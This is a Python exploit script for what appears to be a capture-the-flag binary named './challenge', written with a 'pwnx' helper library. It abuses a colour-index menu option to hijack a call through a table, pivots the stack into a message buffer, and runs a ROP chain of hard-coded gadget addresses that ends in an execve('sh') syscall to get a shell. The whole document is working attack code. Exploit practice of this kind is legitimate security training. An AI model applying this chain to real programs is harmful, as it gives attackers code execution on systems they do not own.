from pwnx import Challenge, utf8


x = Challenge("./challenge")

store = x.menu(
    b"> ",
    name="store",
    message=(1, b"Message?", bytes),
    color=(2, b"> ", int),
    show=3,
)

message = x.buffer(
    name="message", at=0x2F9E38, size=0x1000, encoding="utf8"
).written_by(store.message)

call = x.control(
    store.color.indexes(
        table=0x2F08E8,
        target=message.qword(80),
        trigger=store.show,
        eax=message,
    )
)

pivot = x.control(
    call.pivot(register="eax", stack=message, gadget=0x242D79)
)

rop = (
    x.rop(utf8())
    .pop("rdi", 0x243565)
    .pop("rsi", 0x243431)
    .zero("rax", 0x247431)
    .move("rdx", "rax", 0x2B184E)
    .pop("rcx", 0x247566)
    .move("rax", "rcx", 0x2B4E73)
    .syscall(0x2A6602)
)

x.want(x.execve("sh"), via=pivot, using=rop)
x.run()
